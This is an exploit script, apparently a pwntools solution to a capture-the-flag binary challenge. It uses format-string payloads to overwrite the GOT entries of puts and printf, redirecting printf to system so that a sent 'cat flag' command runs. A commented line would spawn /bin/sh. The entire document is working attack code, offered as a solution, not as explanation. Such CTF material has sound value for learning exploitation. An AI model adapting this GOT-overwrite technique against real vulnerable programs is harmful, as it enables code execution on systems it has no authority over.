from parse_args_and_some_func import *

sh:tube = all_parsed_args['io']
cur_elf:ELF = all_parsed_args['cur_elf']

puts_got_addr = cur_elf.got['puts']
printf_got_addr = cur_elf.got['printf']
system_plt_addr = cur_elf.plt['system']
main_addr = cur_elf.sym['main']

context.arch = "i386"
payload = fmtstr_payload(offset=7, writes={puts_got_addr: main_addr}, write_size="short", write_size_max="short")

sh.recv()
sh.sendline(payload)

payload = fmtstr_payload(offset=7, writes={printf_got_addr: system_plt_addr}, write_size="short", write_size_max="short")
sh.recv()

sleep(2)

sh.sendline(payload)

sh.recv()

sleep(2)

# sh.sendline("/bin/sh")

sh.sendline('cat flag')

sh.interactive()